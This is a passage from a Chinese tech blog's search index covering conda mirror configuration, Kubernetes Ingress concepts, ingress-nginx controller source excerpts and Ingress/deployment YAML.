https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/msys2 conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/pytorch/ conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/r conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main TUNA的help中镜像地址加有引号，需要去掉 ","date":"2021-06-16","objectID":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/:9:1","tags":["Python"],"title":"Anaconda配置python虚拟环境","uri":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/"},{"categories":["Python"],"content":"设置搜索时显示通道地址 conda config --set show_channel_urls yes ","date":"2021-06-16","objectID":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/:9:2","tags":["Python"],"title":"Anaconda配置python虚拟环境","uri":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/"},{"categories":["Python"],"content":"10.恢复默认镜像 conda config --remove-key channels ","date":"2021-06-16","objectID":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/:10:0","tags":["Python"],"title":"Anaconda配置python虚拟环境","uri":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/"},{"categories":["Python"],"content":"问题 在安装conda新环境时，运行： conda create -n ml_py3.8 python=3.8 出现如下错误： An unexpected error has occurred. Conda has prepared the above report. If submitted, this report will be used by core maintainers to improve future releases of conda. Would you like conda to send this report to the core maintainers? [y/N]: N No report sent. To permanently opt-out, use $ conda config --set report_errors false 解决方法： 运行conda clean -i清除索引缓存,保证用的是镜像站提供的索引。 conda clean -i ","date":"2021-06-16","objectID":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/:11:0","tags":["Python"],"title":"Anaconda配置python虚拟环境","uri":"/posts/2021/06/anaconda%E9%85%8D%E7%BD%AEpython%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83/"},{"categories":["K8S"],"content":"Ingress介绍","date":"2021-06-02","objectID":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/","tags":["K8S"],"title":"Ingress介绍","uri":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"Ingress概念和原理介绍 ","date":"2021-06-02","objectID":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/:0:0","tags":["K8S"],"title":"Ingress介绍","uri":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"服务访问 ","date":"2021-06-02","objectID":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/:1:0","tags":["K8S"],"title":"Ingress介绍","uri":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"内部访问方式 ClusterIP ClusterIP 服务是 Kubernetes 的默认服务。它给你一个集群内的服务，集群内的其它应用都可以访问该服务。集群外部无法访问它。在某些场景下我们可以使用 Kubernetes 的 Proxy 模式来访问服务，比如调试服务时。 ","date":"2021-06-02","objectID":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/:1:1","tags":["K8S"],"title":"Ingress介绍","uri":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"外部访问方式 三种外部访问方式 1. NodePort NodePort 服务是引导外部流量到你的服务的最原始方式。NodePort，正如这个名字所示，在所有节点（虚拟机）上开放一个特定端口，任何发送到该端口的流量都被转发到对应服务。 NodePort 服务特征如下： 每个端口只能是一种服务 端口范围只能是在apiserver配置的端口范围内：30000-32767（可调） 不在 YAML 配置文件中指定则会分配一个默认端口 2. LoadBalancer LoadBalancer 服务是暴露服务到 Internet 的标准方式。所有通往你指定的端口的流量都会被转发到对应的服务。它没有过滤条件，没有路由等。这意味着你几乎可以发送任何种类的流量到该服务，像 HTTP，TCP，UDP，WebSocket，gRPC 或其它任意种类。 3. Ingress 通常情况下，Service 和 Pod 的 IP 仅可在集群内部访问。集群外部的请求需要通过负载均衡转发到 Service 在 Node 上暴露的 NodePort 上，然后再由 kube-proxy 通过边缘路由器 (edge router) 将其转发给相关的 Pod 或者丢弃。而 Ingress 就是为进入集群的请求提供路由规则的集合 ","date":"2021-06-02","objectID":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/:1:2","tags":["K8S"],"title":"Ingress介绍","uri":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"Ingress原理 Ingress是一种对象（资源）存在于API Server(ETCD)上，它的整个生命周期（创建、更新、销毁）可以被实时的监听 Ingress是对外（公网）服务到集群内的Service之间规则的集合：允许进入集群的请求被转发至集群内的Service Ingress能把Service（Kubernetes的服务）配置成外网能够访问的URL，流量负载均衡，终止SSL，提供于域名访问的虚拟主机等，用户通过访问URL（API资源服务的形式，例如：caas.one/kibana）进入和请求Service，一个Ingress控制器负责处理所有Ingress的请求流量 详细请看Ingress说明 所谓Ingress对象，其实就是k8s 对“反向代理”的一种抽象。 Ingress 的实现分为两个部分 Ingress Controller 和 Ingress。 Ingress Controller 是流量的入口，是一个实体软件， 一般是Nginx 和 Haproxy（较少使用）。 Ingress 描述具体的路由规则。 Ingress Controller 会监听 api server上的 /ingresses 资源 并实时生效。 Ingerss 描述了一个或者多个 域名的路由规则，以 ingress 资源的形式存在。 简单说： Ingress 描述路由规则， Ingress Controller 实时实现规则。 ","date":"2021-06-02","objectID":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/:2:0","tags":["K8S"],"title":"Ingress介绍","uri":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"Ingress Controller Ingress Controller 实际上是一个监听 Ingress 对象以及它所代理的后端 Service 变化的控制器。 以ingress-nginx-controller为例说明 当一个新的 Ingress 对象由用户创建后，nginx-ingress-controller 就会根据 Ingress 对象里定义的内容，生成一份对应的 Nginx 配置文件（/etc/nginx/nginx.conf），并使用这个配置文件启动一个 Nginx 服务。 而一旦 Ingress 对象被更新，nginx-ingress-controller 就会更新这个配置文件。需要注意的是，如果这里只是被代理的 Service 对象被更新，nginx-ingress-controller 所管理的 Nginx 服务是不需要重新加载（reload）的。这当然是因为 nginx-ingress-controller 通过Nginx Lua方案实现了 Nginx Upstream 的动态配置。 此外，nginx-ingress-controller 还允许你通过 Kubernetes 的 ConfigMap 对象来对上述 Nginx 配置文件进行定制。这个 ConfigMap 的名字，需要以参数的方式传递给 nginx-ingress-controller。而你在这个 ConfigMap 里添加的字段，将会被合并到最后生成的 Nginx 配置文件当中。 一个 Nginx Ingress Controller 提供的服务，其实是一个可以根据 Ingress 对象和被代理后端 Service 的变化，来自动进行更新的 Nginx 负载均衡器。 注意 Core Sync Logics: Ingress-nginx has an internal model of the ingresses, secrets and endpoints in a given cluster. It maintains two copy of that (1) currently running configuration model and (2) the one generated in response to some changes in the cluster. The sync logic diffs the two models and if there’s a change it tries to converge the running configuration to the new one. There are static and dynamic configuration changes. All endpoints and certificate changes are handled dynamically by posting the payload to an internal NGINX endpoint that is handled by Lua. Ingress Controller 注意事项 一个集群中可以有多个 Ingress Controller， 在Ingress 中可以指定使用哪一个Ingress Controller 多个Ingress 规则可能出现竞争 Ingress Controller 本身需要以hostport 或者 service形式暴露出来。 云端可以使用云供应商lb 服务。 Ingress 可以为多个命名空间服务 Ingress只能通过Annotations 进行设置。并且需要确保　Ingress Controller 启动时， 启用了 Annotations 选项 Ingress Controller 放在独立命名空间中， 由管理员来管理。 Ingress 放在各应用的命名空间中， 由应用运维来设置。 ","date":"2021-06-02","objectID":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/:3:0","tags":["K8S"],"title":"Ingress介绍","uri":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"Ingress 相关代码 ","date":"2021-06-02","objectID":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/:4:0","tags":["K8S"],"title":"Ingress介绍","uri":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"IngressSpec // IngressSpec describes the Ingress the user wishes to exist. type IngressSpec struct { // IngressClassName is the name of the IngressClass cluster resource. The // associated IngressClass defines which controller will implement the // resource. This replaces the deprecated `kubernetes.io/ingress.class` // annotation. For backwards compatibility, when that annotation is set, it // must be given precedence over this field. The controller may emit a // warning if the field and annotation have different values. // Implementations of this API should ignore Ingresses without a class // specified. An IngressClass resource may be marked as default, which can // be used to set a default value for this field. For more information, // refer to the IngressClass documentation. // +optional IngressClassName *string `json:\"ingressClassName,omitempty\" protobuf:\"bytes,4,opt,name=ingressClassName\"` // A default backend capable of servicing requests that don't match any // rule. At least one of 'backend' or 'rules' must be specified. This field // is optional to allow the loadbalancer controller or defaulting logic to // specify a global default. // +optional Backend *IngressBackend `json:\"backend,omitempty\" protobuf:\"bytes,1,opt,name=backend\"` // TLS configuration. Currently the Ingress only supports a single TLS // port, 443. If multiple members of this list specify different hosts, they // will be multiplexed on the same port according to the hostname specified // through the SNI TLS extension, if the ingress controller fulfilling the // ingress supports SNI. // +optional TLS []IngressTLS `json:\"tls,omitempty\" protobuf:\"bytes,2,rep,name=tls\"` // A list of host rules used to configure the Ingress. If unspecified, or // no rule matches, all traffic is sent to the default backend. // +optional Rules []IngressRule `json:\"rules,omitempty\" protobuf:\"bytes,3,rep,name=rules\"` // TODO: Add the ability to specify load-balancer IP through claims } // IngressTLS describes the transport layer security associated with an Ingress. type IngressTLS struct { // Hosts are a list of hosts included in the TLS certificate. The values in // this list must match the name/s used in the tlsSecret. Defaults to the // wildcard host setting for the loadbalancer controller fulfilling this // Ingress, if left unspecified. // +optional Hosts []string `json:\"hosts,omitempty\" protobuf:\"bytes,1,rep,name=hosts\"` // SecretName is the name of the secret used to terminate TLS traffic on // port 443. Field is left optional to allow TLS routing based on SNI // hostname alone. If the SNI host in a listener conflicts with the \"Host\" // header field used by an IngressRule, the SNI host is used for termination // and value of the Host header is used for routing. // +optional SecretName string `json:\"secretName,omitempty\" protobuf:\"bytes,2,opt,name=secretName\"` // TODO: Consider specifying different modes of termination, protocols etc. } // IngressStatus describe the current state of the Ingress. type IngressStatus struct { // LoadBalancer contains the current status of the load-balancer. // +optional LoadBalancer v1.LoadBalancerStatus `json:\"loadBalancer,omitempty\" protobuf:\"bytes,1,opt,name=loadBalancer\"` } // IngressRule represents the rules mapping the paths under a specified host to // the related backend services. Incoming requests are first evaluated for a host // match, then routed to the backend associated with the matching IngressRuleValue. type IngressRule struct { // Host is the fully qualified domain name of a network host, as defined by RFC 3986. // Note the following deviations from the \"host\" part of the // URI as defined in RFC 3986: // 1. IPs are not allowed. Currently an IngressRuleValue can only apply to // the IP in the Spec of the parent Ingress. // 2. The `:` delimiter is not respected because ports are not allowed. // Currently the port of an Ingress is implicitly :80 for http and // :443 for https. // Both these may change in the future. // Incoming","date":"2021-06-02","objectID":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/:4:1","tags":["K8S"],"title":"Ingress介绍","uri":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"store store处理资源有： Ingress Endpoint Secret ConfigMap Service store.informers.Ingress = infFactory.Networking().V1beta1().Ingresses().Informer() store.listers.Ingress.Store = store.informers.Ingress.GetStore() store.informers.Endpoint = infFactory.Core().V1().Endpoints().Informer() store.listers.Endpoint.Store = store.informers.Endpoint.GetStore() store.informers.Secret = infFactorySecrets.Core().V1().Secrets().Informer() store.listers.Secret.Store = store.informers.Endpoint.GetStore() store.informers.ConfigMap = infFactoryConfigmaps.Core().V1().ConfigMaps().Informer() store.listers.ConfigMap.Store = store.informers.ConfigMap.GetStore() store.informers.Service = infFactory.Core().V1().Services().Informer() store.listers.Service.Store = store.informers.Service.GetStore() ","date":"2021-06-02","objectID":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/:4:2","tags":["K8S"],"title":"Ingress介绍","uri":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"NGINXController NGINXController构造 // NewNGINXController creates a new NGINX Ingress controller. func NewNGINXController(config *Configuration, mc metric.Collector) *NGINXController { eventBroadcaster := record.NewBroadcaster() eventBroadcaster.StartLogging(klog.Infof) eventBroadcaster.StartRecordingToSink(\u0026v1core.EventSinkImpl{ Interface: config.Client.CoreV1().Events(config.Namespace), }) h, err := dns.GetSystemNameServers() if err != nil { klog.Warningf(\"Error reading system nameservers: %v\", err) } n := \u0026NGINXController{ isIPV6Enabled: ing_net.IsIPv6Enabled(), resolver: h, cfg: config, syncRateLimiter: flowcontrol.NewTokenBucketRateLimiter(config.SyncRateLimit, 1), recorder: eventBroadcaster.NewRecorder(scheme.Scheme, apiv1.EventSource{ Component: \"nginx-ingress-controller\", }), stopCh: make(chan struct{}), updateCh: channels.NewRingChannel(1024), ngxErrCh: make(chan error), stopLock: \u0026sync.Mutex{}, runningConfig: new(ingress.Configuration), Proxy: \u0026TCPProxy{}, metricCollector: mc, command: NewNginxCommand(), } if n.cfg.ValidationWebhook != \"\" { n.validationWebhookServer = \u0026http.Server{ Addr: config.ValidationWebhook, Handler: adm_controller.NewAdmissionControllerServer(\u0026adm_controller.IngressAdmission{Checker: n}), TLSConfig: ssl.NewTLSListener(n.cfg.ValidationWebhookCertPath, n.cfg.ValidationWebhookKeyPath).TLSConfig(), // disable http/2 // https://github.com/kubernetes/kubernetes/issues/80313 // https://github.com/kubernetes/ingress-nginx/issues/6323#issuecomment-737239159 TLSNextProto: make(map[string]func(*http.Server, *tls.Conn, http.Handler)), } } n.store = store.New( config.Namespace, config.ConfigMapName, config.TCPConfigMapName, config.UDPConfigMapName, config.DefaultSSLCertificate, config.ResyncPeriod, config.Client, n.updateCh, config.DisableCatchAll) n.syncQueue = task.NewTaskQueue(n.syncIngress) if config.UpdateStatus { n.syncStatus = status.NewStatusSyncer(status.Config{ Client: config.Client, PublishService: config.PublishService, PublishStatusAddress: config.PublishStatusAddress, IngressLister: n.store, UpdateStatusOnShutdown: config.UpdateStatusOnShutdown, UseNodeInternalIP: config.UseNodeInternalIP, }) } else { klog.Warning(\"Update of Ingress status is disabled (flag --update-status)\") } onTemplateChange := func() { template, err := ngx_template.NewTemplate(nginx.TemplatePath) if err != nil { // this error is different from the rest because it must be clear why nginx is not working klog.ErrorS(err, \"Error loading new template\") return } n.t = template klog.InfoS(\"New NGINX configuration template loaded\") n.syncQueue.EnqueueTask(task.GetDummyObject(\"template-change\")) } ngxTpl, err := ngx_template.NewTemplate(nginx.TemplatePath) if err != nil { klog.Fatalf(\"Invalid NGINX configuration template: %v\", err) } n.t = ngxTpl _, err = watch.NewFileWatcher(nginx.TemplatePath, onTemplateChange) if err != nil { klog.Fatalf(\"Error creating file watcher for %v: %v\", nginx.TemplatePath, err) } filesToWatch := []string{} err = filepath.Walk(\"/etc/nginx/geoip/\", func(path string, info os.FileInfo, err error) error { if err != nil { return err } if info.IsDir() { return nil } filesToWatch = append(filesToWatch, path) return nil }) if err != nil { klog.Fatalf(\"Error creating file watchers: %v\", err) } for _, f := range filesToWatch { _, err = watch.NewFileWatcher(f, func() { klog.InfoS(\"File changed detected. Reloading NGINX\", \"path\", f) n.syncQueue.EnqueueTask(task.GetDummyObject(\"file-change\")) }) if err != nil { klog.Fatalf(\"Error creating file watcher for %v: %v\", f, err) } } return n } // NGINXController describes a NGINX Ingress controller. type NGINXController struct { cfg *Configuration recorder record.EventRecorder syncQueue *task.Queue syncStatus status.Syncer syncRateLimiter flowcontrol.RateLimiter // stopLock is used to enforce that only a single call to Stop send at // a given time. We allow stopping through an HTTP endpoint and // allowing concurrent stoppers leads to stack traces. stopLock *sync.Mutex stopCh","date":"2021-06-02","objectID":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/:4:3","tags":["K8S"],"title":"Ingress介绍","uri":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"syncIngress queue sync函数为syncIngress，遍历queue未同步的task进行sync处理，主要内容： ings := n.store.ListIngresses() hosts, servers, pcfg := n.getConfiguration(ings), servers是按host来构建的server配置 OnUpdate(*pcfg)，进行nginx config更新，实际上就是比较/etc/nginx/nginx.conf和 new-nginx-cfg是否一样，如果不一样，则按new-nginx-cfg最新的内容更新/etc/nginx/nginx.conf，并执行nginx reload // syncIngress collects all the pieces required to assemble the NGINX // configuration file and passes the resulting data structures to the backend // (OnUpdate) when a reload is deemed necessary. func (n *NGINXController) syncIngress(interface{}) error { n.syncRateLimiter.Accept() if n.syncQueue.IsShuttingDown() { return nil } ings := n.store.ListIngresses() hosts, servers, pcfg := n.getConfiguration(ings) n.metricCollector.SetSSLExpireTime(servers) if n.runningConfig.Equal(pcfg) { klog.V(3).Infof(\"No configuration change detected, skipping backend reload\") return nil } n.metricCollector.SetHosts(hosts) if !n.IsDynamicConfigurationEnough(pcfg) { klog.InfoS(\"Configuration changes detected, backend reload required\") hash, _ := hashstructure.Hash(pcfg, \u0026hashstructure.HashOptions{ TagName: \"json\", }) pcfg.ConfigurationChecksum = fmt.Sprintf(\"%v\", hash) err := n.OnUpdate(*pcfg) if err != nil { n.metricCollector.IncReloadErrorCount() n.metricCollector.ConfigSuccess(hash, false) klog.Errorf(\"Unexpected failure reloading the backend:\\n%v\", err) n.recorder.Eventf(k8s.IngressPodDetails, apiv1.EventTypeWarning, \"RELOAD\", fmt.Sprintf(\"Error reloading NGINX: %v\", err)) return err } klog.InfoS(\"Backend successfully reloaded\") n.metricCollector.ConfigSuccess(hash, true) n.metricCollector.IncReloadCount() n.recorder.Eventf(k8s.IngressPodDetails, apiv1.EventTypeNormal, \"RELOAD\", \"NGINX reload triggered due to a change in configuration\") } isFirstSync := n.runningConfig.Equal(\u0026ingress.Configuration{}) if isFirstSync { // For the initial sync it always takes some time for NGINX to start listening // For large configurations it might take a while so we loop and back off klog.InfoS(\"Initial sync, sleeping for 1 second\") time.Sleep(1 * time.Second) } retry := wait.Backoff{ Steps: 15, Duration: 1 * time.Second, Factor: 0.8, Jitter: 0.1, } err := wait.ExponentialBackoff(retry, func() (bool, error) { err := n.configureDynamically(pcfg) if err == nil { klog.V(2).Infof(\"Dynamic reconfiguration succeeded.\") return true, nil } klog.Warningf(\"Dynamic reconfiguration failed: %v\", err) return false, err }) if err != nil { klog.Errorf(\"Unexpected failure reconfiguring NGINX:\\n%v\", err) return err } ri := getRemovedIngresses(n.runningConfig, pcfg) re := getRemovedHosts(n.runningConfig, pcfg) n.metricCollector.RemoveMetrics(ri, re) n.runningConfig = pcfg return nil } // OnUpdate is called by the synchronization loop whenever configuration // changes were detected. The received backend Configuration is merged with the // configuration ConfigMap before generating the final configuration file. // Returns nil in case the backend was successfully reloaded. func (n *NGINXController) OnUpdate(ingressCfg ingress.Configuration) error { cfg := n.store.GetBackendConfiguration() cfg.Resolver = n.resolver content, err := n.generateTemplate(cfg, ingressCfg) if err != nil { return err } err = createOpentracingCfg(cfg) if err != nil { return err } err = n.testTemplate(content) if err != nil { return err } if klog.V(2).Enabled() { src, _ := ioutil.ReadFile(cfgPath) if !bytes.Equal(src, content) { tmpfile, err := ioutil.TempFile(\"\", \"new-nginx-cfg\") if err != nil { return err } defer tmpfile.Close() err = ioutil.WriteFile(tmpfile.Name(), content, file.ReadWriteByUser) if err != nil { return err } diffOutput, err := exec.Command(\"diff\", \"-I\", \"'# Configuration.*'\", \"-u\", cfgPath, tmpfile.Name()).CombinedOutput() if err != nil { if exitError, ok := err.(*exec.ExitError); ok { ws := exitError.Sys().(syscall.WaitStatus) if ws.ExitStatus() == 2 { klog.Warningf(\"Failed to executing diff command: %v\", err) } } } klog.InfoS(\"NGINX configuration change\", \"diff\", string(d","date":"2021-06-02","objectID":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/:4:4","tags":["K8S"],"title":"Ingress介绍","uri":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"Server Hostname Locations SSLPassthrough … // Server describes a website type Server struct { // Hostname returns the FQDN of the server Hostname string `json:\"hostname\"` // SSLPassthrough indicates if the TLS termination is realized in // the server or in the remote endpoint SSLPassthrough bool `json:\"sslPassthrough\"` // SSLCert describes the certificate that will be used on the server SSLCert *SSLCert `json:\"sslCert\"` // Locations list of URIs configured in the server. Locations []*Location `json:\"locations,omitempty\"` // Aliases return the alias of the server name Aliases []string `json:\"aliases,omitempty\"` // RedirectFromToWWW returns if a redirect to/from prefix www is required RedirectFromToWWW bool `json:\"redirectFromToWWW,omitempty\"` // CertificateAuth indicates the this server requires mutual authentication // +optional CertificateAuth authtls.Config `json:\"certificateAuth\"` // ProxySSL indicates the this server uses client certificate to access backends // +optional ProxySSL proxyssl.Config `json:\"proxySSL\"` // ServerSnippet returns the snippet of server // +optional ServerSnippet string `json:\"serverSnippet\"` // SSLCiphers returns list of ciphers to be enabled SSLCiphers string `json:\"sslCiphers,omitempty\"` // SSLPreferServerCiphers indicates that server ciphers should be preferred // over client ciphers when using the SSLv3 and TLS protocols. SSLPreferServerCiphers string `json:\"sslPreferServerCiphers,omitempty\"` // AuthTLSError contains the reason why the access to a server should be denied AuthTLSError string `json:\"authTLSError,omitempty\"` } // Location describes an URI inside a server. // Also contains additional information about annotations in the Ingress. // // In some cases when more than one annotations is defined a particular order in the execution // is required. // The chain in the execution order of annotations should be: // - Whitelist // - RateLimit // - BasicDigestAuth // - ExternalAuth // - Redirect type Location struct { // Path is an extended POSIX regex as defined by IEEE Std 1003.1, // (i.e this follows the egrep/unix syntax, not the perl syntax) // matched against the path of an incoming request. Currently it can // contain characters disallowed from the conventional \"path\" // part of a URL as defined by RFC 3986. Paths must begin with // a '/'. If unspecified, the path defaults to a catch all sending // traffic to the backend. Path string `json:\"path\"` // PathType represents the type of path referred to by a HTTPIngressPath. PathType *networking.PathType `json:\"pathType\"` // IsDefBackend indicates if service specified in the Ingress // contains active endpoints or not. Returning true means the location // uses the default backend. IsDefBackend bool `json:\"isDefBackend\"` // Ingress returns the ingress from which this location was generated Ingress *Ingress `json:\"ingress\"` // IngressPath original path defined in the ingress rule IngressPath string `json:\"ingressPath\"` // Backend describes the name of the backend to use. Backend string `json:\"backend\"` // Service describes the referenced services from the ingress Service *apiv1.Service `json:\"-\"` // Port describes to which port from the service Port intstr.IntOrString `json:\"port\"` // Overwrite the Host header passed into the backend. Defaults to // vhost of the incoming request. // +optional UpstreamVhost string `json:\"upstream-vhost\"` // BasicDigestAuth returns authentication configuration for // an Ingress rule. // +optional BasicDigestAuth auth.Config `json:\"basicDigestAuth,omitempty\"` // Denied returns an error when this location cannot not be allowed // Requesting a denied location should return HTTP code 403. Denied *string `json:\"denied,omitempty\"` // CorsConfig returns the Cors Configuration for the ingress rule // +optional CorsConfig cors.Config `json:\"corsConfig,omitempty\"` // ExternalAuth indicates the access to this location requires // authentication using an external provider // +optional ExternalAuth authreq.Config `json:\"exter","date":"2021-06-02","objectID":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/:4:5","tags":["K8S"],"title":"Ingress介绍","uri":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"部署 ingress是k8s内置资源类型，只需再安装ingress controller，以ingress-nginx-controller为例 ","date":"2021-06-02","objectID":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/:5:0","tags":["K8S"],"title":"Ingress介绍","uri":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"ingress.yaml 注意： 不同版本k8s的apiVersion不同 ingress的namespace要与其关联的service的namespace一致 apiVersion:networking.k8s.io/v1kind:Ingressmetadata:name:example-ingressannotations:nginx.ingress.kubernetes.io/rewrite-target:/$1kubernetes.io/ingress.class:\"nginx\"# nginx.ingress.kubernetes.io/backend-protocol: \"HTTPS\"# nginx.ingress.kubernetes.io/ssl-passthrough: \"true\"spec:rules:- host:hello-world.infohttp:paths:- path:/web1pathType:Prefixbackend:service:name:web-1-svcport:number:8080- path:/web2pathType:Prefixbackend:service:name:web-2-svcport:number:8080---apiVersion:networking.k8s.io/v1kind:Ingressmetadata:name:ivision-ingressnamespace:aistationannotations:# 这里不要使用rewrite-target的通配符/$1 或 $2，需根据实际业务场景配置# nginx.ingress.kubernetes.io/rewrite-target: /$1# 说明：对于不同的业务需要不同的rewrite-target处理（/ 或 /$1），则分开不同的ingress配置# 这里标识3个路由都rewrite到了/路径下nginx.ingress.kubernetes.io/rewrite-target:/# 在多ingress-controller中，指定使用nginx-ingress，需与nginx-ingress-controller的参数一致（默认值：nginx）kubernetes.io/ingress.class:\"nginx\"# 如后端服务为https，则backend-protocol: \"HTTPS\"# 该配置实际上是根据loc.BackendProtocol = anns.BackendProtocol，再进行buildProxyPass操作，# proxy_pass 配置方式: [proxy_pass http://upstream名称, proxy_pass https://upstream名称, proxy_pass grpc://upstream名称, ...] # 在nginx.conf中，配置 proxy_pass https://upstream_balancer# 如果http，则配置proxy_pass http://upstream_balancernginx.ingress.kubernetes.io/backend-protocol:\"HTTPS\"# ssl-passthrough 会本地启动tcp代理服务，绕过了nginx# nginx.ingress.kubernetes.io/ssl-passthrough: \"true\"# nginx.ingress.kubernetes.io/force-ssl-redirect: \"false\"spec:rules:# 采用域名# - host: test.example.com# http:# paths:# - path: /# pathType: Prefix# backend:# service:# name: ivision# port:# number: 8443# 可使用ip方式，匹配路径全路由- http:paths:- path:/vvvpathType:Prefixbackend:service:name:web-svcport:number:8443- path:/pathType:Prefixbackend:service:name:web-svcport:number:8443# 可以放到另个ingress配置中 - http:paths:- path:/docpathType:Prefixbackend:service:name:doc-svcport:number:8443 ","date":"2021-06-02","objectID":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/:5:1","tags":["K8S"],"title":"Ingress介绍","uri":"/posts/2021/06/ingress%E4%BB%8B%E7%BB%8D/"},{"categories":["K8S"],"content":"deploy.yaml 官方安装ingress-nginx-controller例子 kubectl apply -f https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v0.46.0/deploy/static/provider/baremetal/deploy.yaml 也可先把deploy.yaml下载下来 apiVersion:v1kind:Namespacemetadata:name:ingress-nginxlabels:app.kubernetes.io/name:ingress-nginxapp.kubernetes.io/instance:ingress-nginx---# Source: ingress-nginx/templates/controller-serviceaccount.yamlapiVersion:v1kind:ServiceAccountmetadata:labels:helm.sh/chart:ingress-nginx-3.30.0app.kubernetes.io/name:ingress-nginxapp.kubernetes.io/instance:ingress-nginxapp.kubernetes.io/version:0.46.0app.kubernetes.io/managed-by:Helmapp.kubernetes.io/component:controllername:ingress-nginxnamespace:ingress-nginxautomountServiceAccountToken:true---# Source: ingress-nginx/templates/controller-configmap.yamlapiVersion:v1kind:ConfigMapmetadata:labels:helm.sh/chart:ingress-nginx-3.30.0app.kubernetes.io/name:ingress-nginxapp.kubernetes.io/instance:ingress-nginxapp.kubernetes.io/version:0.46.0app.kubernetes.io/managed-by:Helmapp.kubernetes.io/component:controllername:ingress-nginx-controllernamespace:ingress-nginxdata:---# Source: ingress-nginx/templates/clusterrole.yamlapiVersion:rbac.authorization.k8s.io/v1kind:ClusterRolemetadata:labels:helm.sh/chart:ingress-nginx-3.30.0app.kubernetes.io/name:ingress-nginxapp.kubernetes.io/instance:ingress-nginxapp.kubernetes.io/version:0.46.0app.kubernetes.io/managed-by:Helmname:ingress-nginxrules:- apiGroups:- ''resources:- configmaps- endpoints- nodes- pods- secretsverbs:- list- watch- apiGroups:- ''resources:- nodesverbs:- get- apiGroups:- ''resources:- servicesverbs:- get- list- watch- apiGroups:- extensions- networking.k8s.io # k8s 1.14+resources:- ingressesverbs:- get- list- watch- apiGroups:- ''resources:- eventsverbs:- create- patch- apiGroups:- extensions- networking.k8s.io # k8s 1.14+resources:- ingresses/statusverbs:- update- apiGroups:- networking.k8s.io # k8s 1.14+resources:- ingressclassesverbs:- get- list- watch---# Source: ingress-nginx/templates/clusterrolebinding.yamlapiVersion:rbac.authorization.k8s.io/v1kind:ClusterRoleBindingmetadata:labels:helm.sh/chart:ingress-nginx-3.30.0app.kubernetes.io/name:ingress-nginxapp.kubernetes.io/instance:ingress-nginxapp.kubernetes.io/version:0.46.0app.kubernetes.io/managed-by:Helmname:ingress-nginxroleRef:apiGroup:rbac.authorization.k8s.iokind:ClusterRolename:ingress-nginxsubjects:- kind:ServiceAccountname:ingress-nginxnamespace:ingress-nginx---# Source: ingress-nginx/templates/controller-role.yamlapiVersion:rbac.authorization.k8s.io/v1kind:Rolemetadata:labels:helm.sh/chart:ingress-nginx-3.30.0app.kubernetes.io/name:ingress-nginxapp.kubernetes.io/instance:ingress-nginxapp.kubernetes.io/version:0.46.0app.kubernetes.io/managed-by:Helmapp.kubernetes.io/component:controllername:ingress-nginxnamespace:ingress-nginxrules:- apiGroups:- ''resources:- namespacesverbs:- get- apiGroups:- ''resources:- configmaps- pods- secrets- endpointsverbs:- get- list- watch- apiGroups:- ''resources:- servicesverbs:- get- list- watch- apiGroups:- extensions- networking.k8s.io # k8s 1.14+resources:- 